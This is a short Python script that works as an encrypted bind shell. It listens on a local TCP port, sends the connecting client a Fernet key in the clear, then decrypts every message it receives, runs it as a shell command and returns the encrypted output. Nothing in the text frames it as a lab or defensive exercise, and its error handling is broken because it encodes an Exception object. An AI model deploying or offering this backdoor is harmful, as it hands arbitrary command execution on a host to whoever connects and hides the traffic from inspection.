from cryptography.fernet import Fernet
import socket
import subprocess

def execute_command(command):

    try:

        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return f"Error executing command: {result.stderr}"
        
    except Exception as e:

        return str(e)

def generate_key():

    return Fernet.generate_key()

def key_exchange(conn):
    
    key = generate_key()
    conn.sendall(key)
    return key

def main():

    key = None
    host = '127.0.0.1'
    port = 116

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        s.bind((host, port))
        s.listen()
        conn, addr = s.accept()
        with conn:

            print('Connected by', addr)
            key = key_exchange(conn)
            cipher_suite = Fernet(key)
            while True:

                encrypted_data = conn.recv(1024)
                if not encrypted_data:
                    break
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                print('Received:', decrypted_data.decode())

                try:

                    # Respond to client
                    response = execute_command(decrypted_data.decode())
                    encrypted_response = cipher_suite.encrypt(response.encode())
                    conn.sendall(encrypted_response)

                except Exception as e:

                    print(str(e))
                    response = cipher_suite.encrypt(e.encode())
                    conn.sendall(response)

if __name__ == "__main__":
    main()
